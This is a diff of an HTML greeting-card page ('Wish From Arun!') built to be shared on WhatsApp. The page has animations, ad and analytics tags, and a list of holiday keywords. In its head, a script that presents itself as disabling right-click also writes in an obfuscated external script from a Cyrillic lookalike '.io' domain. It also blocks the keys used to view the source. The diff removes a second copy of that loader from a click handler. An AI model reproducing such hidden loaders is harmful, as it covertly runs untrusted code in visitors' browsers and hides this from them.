@@ -1,33 +1,106 @@
 <!DOCTYPE html>
 <html>
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
 <meta name="google" content="notranslate">
-<title>Surprise for you from Arun!</title>
+<title>Wish From Arun!</title>
 <meta property="og:type" content="website" />
-<meta property="og:title" content=" Surprise For You From Arun" />
+<meta property="og:title" content="Wish From Arun" />
 <meta property="og:url" content="http://wow-nice.xyz/?u=Arun" />
 <meta property="og:description" content="CLICK HERE" />
 <meta property="og:site_name" content="Create New Wish" />
 <meta property="og:image" content="OVSzeDm.png">
 <link rel="icon" type="image/png" href="scP5WrK.png">
-<link rel="stylesheet" href="hopeing.css" />
+<link type="text/css" rel="stylesheet" href="animate.min.css" />
+<link rel="stylesheet" href="hopeing.css">
 <link rel="stylesheet" href="animate.css">
-<link rel="stylesheet" type="text/css" href="css/animate.min.css">
-<link rel="icon" type="image/png" href="boy.png">
 <script src="https://code.createjs.com/createjs-2015.11.26.min.js"></script>
 <script>
 //** disable right click & ctrl + u javascript code **//
 document.addEventListener('contextmenu', event => event.preventDefault()); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o/1"></s'+'cr'+'ipt>'); document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey &&  (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
 </script>
-<script src="script.js"></script>
+<style>
 
-<style>	
-.m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
+	.m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
     .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
-	 
+	.topbtn {
+  border-radius: 5px;
+  box-sizing: border-box;
+  padding: 5px;
+  position: fixed;
+  left:0px;
+  top:0px;
+  height:40px;
+  width:100%;
+  background:#3b5998;
+  color: #ffffff;
+  font-size: 16px;
+  text-align: center;
+  text-decoration: none;
+}
+
+.topbtn:hover {
+  text-decoration: none;
+    position: fixed;
+}
+.footerbtn {
+ 
+            display: block;
+            line-height: 15px;
+            position: fixed;
+            left:0px;
+            bottom:0px;
+            height:55px;
+            
+border-radius: 15px;
+  box-sizing: border-box;
+  padding: 5px;
+  background:#34af23;
+  color: #ffffff;
+  font-size: 20px;
+  text-align: center;
+  text-decoration: none;
+  width:95%;
+ margin-left:10px;
+            margin-right:30px;
+            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
+            animation: footer infinite linear 1s;
+            -webkit-transform: translate3d(30%,0,0);
+            transform: translate3d(30%,0,0);
+            position: fixed;
+           
+}
+
+.footerbtn :active {
+            box-shadow: none
+        }
+
+        @-webkit-keyframes footer {
+            from {
+                -webkit-transform: rotateZ(0)
+            }
+            25% {
+                -webkit-transform: rotateZ(1.5deg)
+            }
+            50% {
+                -webkit-transform: rotateZ(0deg)
+            }
+            75% {
+                -webkit-transform: rotateZ(-1.5deg)
+            }
+            to {
+                -webkit-transform: rotateZ(0)
+            }}
+	 canvas {
+      cursor: crosshair;
+      display: block;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 80%;
+    }
 .shake{0%,to{-webkit-transform:translateZ(0);transform:translateZ(0)}10%,30%,50%,70%,90%{-webkit-transform:translate3d(-10px,0,0);transform:translate3d(-10px,0,0)}20%,40%,60%,80%{-webkit-transform:translate3d(10px,0,0);transform:translate3d(10px,0,0)}}@keyframes shake{0%,to{-webkit-transform:translateZ(0);transform:translateZ(0)}10%,30%,50%,70%,90%{-webkit-transform:translate3d(-10px,0,0);transform:translate3d(-10px,0,0)}20%,40%,60%,80%{-webkit-transform:translate3d(10px,0,0);transform:translate3d(10px,0,0)}}.shake{-webkit-animation-name:shake;animation-name:shake}
 .swing{20%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}40%{-webkit-transform:rotate(-10deg);transform:rotate(-10deg)}60%{-webkit-transform:rotate(5deg);transform:rotate(5deg)}80%{-webkit-transform:rotate(-5deg);transform:rotate(-5deg)}to{-webkit-transform:rotate(0deg);transform:rotate(0deg)}}@keyframes swing{20%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}40%{-webkit-transform:rotate(-10deg);transform:rotate(-10deg)}60%{-webkit-transform:rotate(5deg);transform:rotate(5deg)}80%{-webkit-transform:rotate(-5deg);transform:rotate(-5deg)}to{-webkit-transform:rotate(0deg);transform:rotate(0deg)}}.swing{-webkit-transform-origin:top center;transform-origin:top center;-webkit-animation-name:swing;animation-name:swing}
 .enter-name input[type=name] {
@@ -70,31 +143,7 @@ document.addEventListener('contextmenu', event => event.preventDefault()); docum
     	text-decoration: none;
     	animation-duration: 4s !important;
 }
-.jas{
-    
-	border-radius: 10px;
-    	font-size: 21px;
-    	padding: 4px;
-    	position: fixed;
-    	right: 2px;
-    	bottom: 3px;
-    	height: 50px;
-    	width: 23%;
-    	display: inline-block;
-    	color: #fff;
-    	background-color:a460f4;
-    	border: none;
-    	letter-spacing: .5px;
-    	transition: .2s ease-out;
-    	cursor: pointer;
-    	line-height: 36px;
-    	outline: 0;
-    	text-transform: uppercase;
-    	vertical-align: middle;
-    	text-decoration: none;
-    	animation-duration: 4s !important;
-    	
-}
+
 .enter-name input[type=name]::-webkit-input-placeholder { 
 	color: #fff;
   	font-size: 18px;	
@@ -213,7 +262,7 @@ h1:nth-child(10){ transform:translateZ(45px); }
 background: #FC466B;  /* fallback for old browsers */
 background: -webkit-linear-gradient(to right, #3F5EFB, #667db6);  /* Chrome 10-25, Safari 5.1-6 */
 background: linear-gradient(to right, #3F5EFB, #667db6); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */
-background-image: url("17.jpg")!important;
+background-image: url("ch.jpg")!important;
 //background-position: center;
 }
           p.card-title.center-align.comic.wishesed {
@@ -294,9 +343,9 @@ img#whatsappicon {
   -webkit-transform: scale3d(1, 1, 1);
   transform: scale3d(1, 1, 1);
   }
-  }body {
+  }
+  body {
     background-size: 300% 100%;
-   
 }
 .rock{animation:infinite 1s rock}
 @keyframes rock {  0% {    transform: rotate(-1deg);  }
@@ -724,6 +773,7 @@ h3 {
   -o-animation: glowing 1500ms infinite;
   animation: glowing 1500ms infinite;
 }
+
 /* Firework Animation */
 .pyro {
   position: absolute;
@@ -906,73 +956,6 @@ h3 {
 
 /* Custom Animation classes */
  </style>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="slide.js" type="text/javascript"></script>
-<script>
-    function getQueryVariable(variable) {
-      var query = window.location.search.substring(1);
-      var vars = query.split('&');
-      for (var i = 0; i < vars.length; i++) {
-          var pair = vars[i].split('=');
-          if (decodeURIComponent(pair[0]) == variable) {
-              return decodeURIComponent(pair[1]);
-          }
-      }
-      console.log('Query variable %s not found', variable);
-  }
-    </script>
-<script type="text/javascript">
-$(document).ready(function() { $curtainopen = false; $(".rope").click(function(){ $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:350, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } return false; }); });
-</script>
-<style type="text/css">
-      *{
-        margin:0;
-        padding:0;
-      }
-      body {
-        text-align: center;
-        
-      }
-      img{
-      border: none;
-    }
-.leftcurtain{
-      width: 50%;
-      height: 150%;
-      top: 0px;
-      left: 0px;
-      position: absolute;
-      z-index: 2;
-    }
-     .rightcurtain{
-      width: 51%;
-      height: 150%;
-      right: 0px;
-      top: 0px;
-      position: absolute;
-      z-index: 3;
-    }
-    .rightcurtain img, .leftcurtain img{
-      width: 100%;
-      height: 100%;
-    }
-    .logo{
-      margin: 0px auto;
-      margin-top: 150px;
-    }
-    .rope{
-      position: absolute;
-      top: 0px;
-      left: 40%;
-      z-index: 4;
-    } 
-.centered {
-    position: absolute;
-    top: 75%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-}
-</style>
 <script>
 // Set the date we're counting down to
 var countDownDate = new Date("Jan 01, 2019 00:00:00").getTime();
@@ -1014,13 +997,6 @@ var x = setInterval(function() {
 </script>
 </head>
 <body style=" background : url(FotoJet-bag-min.png);">
-<div class="leftcurtain"><img src="163074651.jpg" /></div>
-<div class="rightcurtain"><img src="163074652.jpg" /></div>
-<a class="rope" href="" onclick="PlaySound()">
-<div style="font-size: 25px;text-shadow: 1px 1px 3px white, 1px 1px 3px white, -1px -1px 3px white, -1px -1px 3px white;color: #ff0006;font-weight: bold;">👇👇🏻 <br>Touch the Gift!</div>
-<img src="5a1d5a5e6374d2.4689672515118731184074-min.png" class="center animated pulse" style="max-width:150px; width: 100%;" />
-</a>
-
 <marquee class="m1" behavior="scroll" direction="up" scrolldelay="5"> <br>
 <img src="balloons.png" height="35px" width="35px" /><br><br>
 <img src="confetti.png" height="35px" width="35px" /><br><br>
@@ -1089,7 +1065,12 @@ var x = setInterval(function() {
 <div class="before"></div></div>
 <div class="g-ad">
 <center>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
+<ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px" data-ad-client="ca-pub-5176807005841691" data-ad-slot="4258511036"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 </center>
 </div>
 <script>
@@ -1100,9 +1081,9 @@ var x = setInterval(function() {
 </script>
 <br>
 <figure>
-<h1 id="man">Arun</h1>
-<h1 id="mana">Arun</h1>
-<h1 id="manb">Arun</h1>
+<h1>Arun</h1>
+<h1>Arun</h1>
+<h1>Arun</h1>
 </figure>
 <br>
 <br>
@@ -1136,33 +1117,86 @@ Tis the season to keep in touch with those we value very much!
 
 <div class="g-ad">
 <center>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
+<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-5176807005841691" data-ad-slot="6281614112"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 </center>
 </div>
-<br>
-<br>
-</b></center></div>
-</div></center>
-<b style="font-size:1.2em;color:white;font-weight:bold;text-align:left;">
-<form>
-<div class="enter-name">
-<input id="molu" class="animated pulse infinite" style="background-color:red;" type="name" required="" maxlength="50" name="u" placeholder="👉 Enter Your Name Here 🏵">
-
-
-</div>
-
-</form>
-<button id="anand" class="jas animated shake infinite" style="background-color:red;"><span>👉</span> Go</button>
+<a class="footerbtn" href="whatsapp://send?text=What a lovely Surprise by *Arun*! %0A*->* Open the link%0A*->* Touch the Gift.👇%0D%0Awow-nice.xyz/?u=Arun"><img width="25px" height="25px" src="wtsp.svg"> Share on Whatsapp <img width="25px" height="25px" src="wtsp.svg"></a>
 <footer class="footer">
-    
+<div class="row" style="white:white;font: 100 1.3em/1 Oswald, sans-serif;line-height:1.0;font-weight:bold;">
+<footer class="footer">
 <div class="row" style="white:white;font: 100 1.3em/1 Oswald, sans-serif;line-height:1.0;font-weight:bold;">
 </div></footer>
-</b>
-<script>
-    document.getElementById("man").innerHTML = getQueryVariable('name');
-    document.getElementById("mana").innerHTML = getQueryVariable('name');
-    document.getElementById("manb").innerHTML = getQueryVariable('name');
-</script>
+</div>
+
+<center><div class="row" style="color:black;font: 100 0.3em/1 Oswald, sans-serif;line-height:0.2;font-weight:bold;">
+New Year Messages and Greetings 2019
+New Year Quotes
+New Year Messages 2019
+New Year Resolution
+New Year Party Ideas
+New Year Party Invitation
+New Year Messages in Hindi
+New Year in Different Languages
+New Year Recipes
+New Year Poems
+New Year Songs
+New Year Gift Ideas
+New Year History
+New Year Celebration Ideas
+New Year Party Decorations
+12 Days of Christmas
+Christmas Quotes
+Christmas Carols
+Christmas Stockings
+Christmas Gift Ideas
+Christmas Images
+Bible Verses
+Christmas Movies
+Santa Claus
+Christmas Tree
+Christmas Lights
+Christmas Wallpapers
+Christmas Songs
+Happy Holidays
+Christmas Cards
+Christmas Messages
+Merry Christmas
+Christmas Decorations
+Christmas Coloring Pages
+Christmas Dinner Ideas
+Christmas Ornaments
+Christmas Recipes
+Christmas Poems
+Christmas Crafts
+Christmas Wreaths
+Christmas Ideas
+Christmas Flowers
+Christmas Traditions
+Party Ideas
+Christmas Candles
+Party Invitations
+Funny Christmas
+Christmas Photo Cards
+About Christmas Around The World
+Christmas Symbols
+Christmas History
+Party Themes
+Christmas Plays
+Christmas Slogans
+Christmas Thanks Season's
+Greetings Season's Greetings Quotes
+Christmas Eve Quotes
+Christmas Cake Images Postcards
+Cute Christmas Cards
+Creative Cards
+Holiday eCards
+Christmas Hindi Messages
+</div></center></footer></b></div></div></div></center>
 <script src="snow.js"></script>
 <script>
       jQuery(document).ready(function(e) {
@@ -1176,25 +1210,6 @@ Tis the season to keep in touch with those we value very much!
            });
       });
 	  
-</script>
-<script>
-        var userName='';
-        var fulllink='';
-        
-        
-        $(document).ready(function() {
-         $('#anand').on("click", function(e) {
-             userName = document.getElementById("molu").value;
-        console.log("worked"+userName);
-           if(userName==''){
-             alert("please insert your name before share");
-           }
-           else{
-        fulllink = "https://christmas-greetings.tk/?name="+userName;
-        window.location.replace(fulllink);
-           }
-         })
-        });
 </script>
 <script>
 var myIndex = 0;
@@ -1212,11 +1227,16 @@ function carousel() {
     setTimeout(carousel, 2000); // Change image every 2 seconds
 }
 </script>
-<audio id="audiocracker" src="" autostart="false"></audio>
-<script>
-    function PlaySound() {
-          var sound = document.getElementById("audiocracker");
-          sound.play()
-      }
-    </script>
+
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4197424,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4197424&101" alt="free page hit counter" border="0"></a></noscript>
+
 </body></html>
